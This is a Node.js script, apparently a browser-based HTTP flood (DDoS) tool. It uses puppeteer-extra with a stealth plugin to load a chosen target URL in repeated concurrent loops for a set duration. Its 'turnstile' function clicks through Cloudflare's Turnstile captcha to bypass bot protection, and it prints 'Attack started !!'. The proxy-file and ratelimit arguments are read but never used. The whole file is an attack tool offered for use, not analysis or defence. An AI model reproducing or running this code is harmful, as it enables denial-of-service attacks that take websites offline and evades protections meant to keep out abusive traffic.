const puppeteer = require('puppeteer-extra');
const fs = require('fs');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');

puppeteer.use(StealthPlugin());

const target = process.argv[2];
const time = process.argv[3];
const threads = process.argv[4];
const ratelimit = process.argv[5];
const proxyfile = process.argv[6];

if (process.argv.length !== 7) {
    console.log('Usage: node browser.js <target> <time> <threads> <ratelimit> <proxyfile>');
    process.exit(1);
}

const proxies = fs.readFileSync(proxyfile, 'utf-8').toString().replace(/\r/g, '').split('\n');

async function turnstile(page) {
    const iframeElement = await page.$('iframe[allow="cross-origin-isolated; fullscreen"]');

    if (!iframeElement) {
        return;
    }

    const iframeBox = await iframeElement.boundingBox();

    if (!iframeBox) {
        return;
    }

    const x = iframeBox.x + (iframeBox.width / 2);
    const y = iframeBox.y + (iframeBox.height / 2);

    await page.mouse.move(x, y);
    await new Promise(resolve => setTimeout(resolve, 111));
    await page.mouse.down();
    await new Promise(resolve => setTimeout(resolve, 222));
    await page.mouse.up();
    await new Promise(resolve => setTimeout(resolve, 100));
    await page.click('body', { x, y });
}

const startAttack = async () => {
    const browser = await puppeteer.launch({ headless: false });
    const page = await browser.newPage();
    await page.setViewport({ width: 1366, height: 768 });

    console.log('Attack started !!');
    for (let i = 0; i < threads; i++) {
        const thread = async () => {
            try {
                while (true) {
                    await page.goto(target, { waitUntil: 'domcontentloaded' });
                    await page.waitForTimeout(1000);
                    await turnstile(page); // Menggunakan fungsi turnstile untuk melewati captcha
                    await page.waitForTimeout(1000);
                    await page.goto(target, { waitUntil: 'domcontentloaded' });
                }
            } catch (error) {
                console.error(error);
            }
        };
        thread();
    }

    setTimeout(() => {
        browser.close();
        console.log('Attack finished !!');
    }, time * 1000);
};

startAttack();
